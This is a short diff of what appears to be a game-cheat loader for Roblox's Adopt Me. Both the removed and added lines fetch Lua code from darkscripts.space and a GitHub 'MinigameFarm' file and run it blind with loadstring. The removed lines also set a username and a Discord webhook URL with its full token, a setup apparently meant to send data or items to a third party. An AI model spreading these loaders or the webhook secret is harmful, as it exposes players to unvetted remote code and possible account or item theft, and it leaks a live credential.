@@ -1,5 +1,2 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/boygamer1/AdoptMeWinter/refs/heads/main/MinigameFarm", true))()
-Username = "mwqrt" -- Roblox Username
-Webhook = "https://discord.com/api/webhooks/1323243460072837130/uLYnA-CzmSW81bc_fz-ojwdKcnNzOB6H90ZgRjG_mBQ2bOwd5yg67ak3ZQvZAwFz3qD2"
-loadstring(game:HttpGet("https://darkscripts.space/adoptme"))()
-                                            
+loadstring(game:HttpGet('https://darkscripts.space/scripts/93ba0ca1-f6a8-4785-95b3-06e26410f166_1192854516018716773.lua',true))()                              
+loadstring(game:HttpGet("https://raw.githubusercontent.com/boygamer1/AdoptMeWinter/refs/heads/main/MinigameFarm", true))()                      
